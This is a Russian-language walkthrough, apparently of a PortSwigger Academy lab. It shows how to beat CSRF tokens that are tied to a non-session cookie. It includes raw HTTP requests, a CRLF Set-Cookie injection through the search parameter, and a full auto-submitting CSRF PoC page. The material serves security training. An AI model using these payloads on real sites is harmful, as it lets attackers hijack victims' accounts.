В вариации предыдущей уязвимости некоторые приложения действительно привязывают токен CSRF к файлу cookie, но не к тому же файлу cookie, который используется для отслеживания сеансов. Это может легко произойти, если приложение использует две различные платформы, одну для обработки сеансов и одну для защиты CSRF, которые не интегрированы вместе:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
как видим тут 2 разных `csrfKey` и `csrf`

Эту ситуацию труднее использовать, но она все еще уязвима. Если веб-сайт содержит какое-либо поведение, которое позволяет злоумышленнику установить файл `cookie` в браузере жертвы, то атака возможна. Злоумышленник может войти в приложение, используя свою собственную учетную запись, получить действительный токен и связанный с ним файл `cookie`, использовать поведение настройки файлов `cookie` для размещения своего файла `cookie` в браузере жертвы и передать свой токен жертве в ходе атаки CSRF.

логинимся под `wiener:peter`

и включаем `proxy` -> `intercept `

и пытаемся сменить пароль на `change@me.com`

и отправляем данный запрос в `Repeater`, а в проксе запрос дропаем
```
POST /my-account/change-email HTTP/2
Host: 0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net
Cookie: csrfKey=ssGmYFn9dNvnvgaX7OFIdwo7hvG7niuR; session=OqctZvKHzqNYVo76Zi9FNLR3aRKY2Taj
...
email=change%40me.com&csrf=EFhYOFcLdoMLyHw4cExoSUTId8p8dDyr
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/1.png)

Видим, что существуют 2 параметра `csrfKey` и `csrf token`, которые могут быть связаны между собой

Если изменить один из них, то получим отказ
К примеру, к csrf token добавим `qqqq`, тем самым делая его другим
```
csrfKey=ssGmYFn9dNvnvgaX7OFIdwo7hvG7niuR
csrf=EFhYOFcLdoMLyHw4cExoSUTId8p8dDyrqqqq
```
и получим ответ 
```
"Invalid CSRF token"
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/2.png)
Далее, необходимо проверить, связаны ли эти 2 токена с сессией. Иначе говоря, если подставить `session` другого пользователя, изменится ли почтовый ящик?

Этим мы и займемся

Далее в режиме инкогнито зайдем под `carlos:montoya`
и увидим у него следующие токены
```
session aC53cJ8ZFwCaJLEJVx3Qlhb76W3Eaidj
csrfKey asdedxCbt8ydrAqg7DNX1mz48nCnNstQ
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/3.png)
На данный момент нужен только `session` токен

Вернемся в наш старый репитер и изменим параметр сессии на карлосовский
```
POST /my-account/change-email HTTP/2
Host: 0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net
Cookie: csrfKey=ssGmYFn9dNvnvgaX7OFIdwo7hvG7niuR; session=aC53cJ8ZFwCaJLEJVx3Qlhb76W3Eaidj
email=change2%40me.com&csrf=EFhYOFcLdoMLyHw4cExoSUTId8p8dDyr
```
и видим, что email у сarlos'a сменился на `change2@me.com`
Оттого делаем вывод, что `CSRFkey` и `csrf` токены связаны между собой, но не связаны с сессией пользователя, под которой он сидит

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/4.png)

Далее. Если мы вернемся на страницу с блогами, и введем в поисковую строку `test`, далее пройдем в `Proxy` -> `HTTP history`

Заметим следующую особенность. После выполнения поиска в куки записывается параметр 
```
LastSearchTerm=test
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/5.png)

`%0d%0a` - перевод строки

добавим и установим куки пользователя `carlos` - `asdedxCbt8ydrAqg7DNX1mz48nCnNstQ`
```
GET /?search=test%0d%0aSet-Cookie:%20asdedxCbt8ydrAqg7DNX1mz48nCnNstQ HTTP/2
```
и видим, что действительно обновилась кука у нашего пользователя

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/6.png)

Далее вернемся к запросу по смене почты у обычного пользователя
```
POST /my-account/change-email HTTP/2
```

и нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
```

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="hidden" name="csrf" value="EFhYOFcLdoMLyHw4cExoSUTId8p8dDyr" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
и изменим данный PoC
Куки и токены атакера:
```
csrfKey=asdedxCbt8ydrAqg7DNX1mz48nCnNstQ; 
session=aC53cJ8ZFwCaJLEJVx3Qlhb76W3Eaidj
csrf=OIMtWwFIxjpS9mCqv3OEd34gfzpQETfm
```
и изменим поля, добавив 
```
<img src="https://0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=asdedxCbt8ydrAqg7DNX1mz48nCnNstQ%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

И получим следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="hidden" name="csrf" value="OIMtWwFIxjpS9mCqv3OEd34gfzpQETfm" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a6b009503b2a0838012c6b0006e00b0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=asdedxCbt8ydrAqg7DNX1mz48nCnNstQ%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
Нажмем `store` и `Deliver exploit to victim` и получим уведомление об успешно выполненной атаке
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/5.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/pics%20for%20walkthrough/7.png)
